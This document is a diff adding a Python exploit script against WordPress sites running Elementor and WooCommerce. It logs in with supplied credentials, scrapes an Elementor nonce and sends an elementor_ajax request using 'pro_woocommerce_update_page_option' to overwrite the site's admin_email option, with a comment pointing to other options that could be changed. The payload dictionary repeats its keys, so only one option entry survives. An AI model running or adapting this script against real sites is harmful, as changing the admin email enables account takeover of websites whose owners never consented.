@@ -1,0 +1,83 @@
+import requests
+from bs4 import BeautifulSoup
+
+website = ''
+username = ''
+password = ''
+
+print("Starting script...")
+
+# Login to the website
+print("Logging in...")
+session = requests.Session()
+login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
+login_response = session.post(website + '/wp-login.php', data=login_data)
+
+if login_response.status_code == 200:
+    print("Logged in successfully.")
+else:
+    print("Login failed.")
+    exit()
+
+# Fetch the nonce
+print("Fetching nonce...")
+response = session.get(website + '/wp-admin/?wc-ajax=1')
+soup = BeautifulSoup(response.text, "html.parser")
+wp_nonce = soup.find('script', {'id': 'elementor-common-js-before'}).text.split('"nonce":"')[1].split('"')[0]
+if wp_nonce:
+    print(f"Nonce fetched: {wp_nonce}")
+else:
+    print("Nonce not found. Saving DOM to file.")
+    with open("failed_dom.html", "w", encoding="utf-8") as f:
+        f.write(response.text)
+    exit()
+
+# Change admin email
+print("Changing admin email...")
+# For payload option_name check https://wp-kama.com/1609/wordpress-options-list
+payload = {
+    'actions': {
+        'pro_woocommerce_update_page_option': {
+            'action': 'pro_woocommerce_update_page_option',
+            'data': {
+                'option_name': 'new_admin_email',
+                'editor_post_id': ''
+            },
+            'action': 'pro_woocommerce_update_page_option',
+            'data': {
+                'option_name': 'admin_email',
+                'editor_post_id': ''
+            }
+        }
+    },
+    '_nonce': wp_nonce,
+    'editor_post_id': '',
+    'initial_document_id': '999999',
+    'action': 'elementor_ajax'
+}
+
+query_string = '&'.join([f'{key}={value}' for key, value in payload.items() if key != 'actions'])
+actions_query_string = 'actions=' + requests.utils.quote(str(payload['actions']).replace("'", '"'))
+final_payload = f'{actions_query_string}&{query_string}'
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Referer': website + '/wp-admin/admin.php?page=elementor',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Redirect': 'Follow'
+}
+
+response = session.post(website + '/wp-admin/admin-ajax.php?wc-ajax=1', headers=headers, data=final_payload)
+print(f"Request URL: {response.url}")
+print(f"Status code: {response.status_code}")
+print(f"Request headers: {response.request.headers}")
+print(f"Request body: {response.request.body}")
+print(f"Response headers: {response.headers}")
+print(f"Response text: {response.text}")
+
+if response.status_code == 200:
+    print("Admin email changed successfully.")
+else:
+    print("Failed to change admin email.")
+
+print("Script finished.")
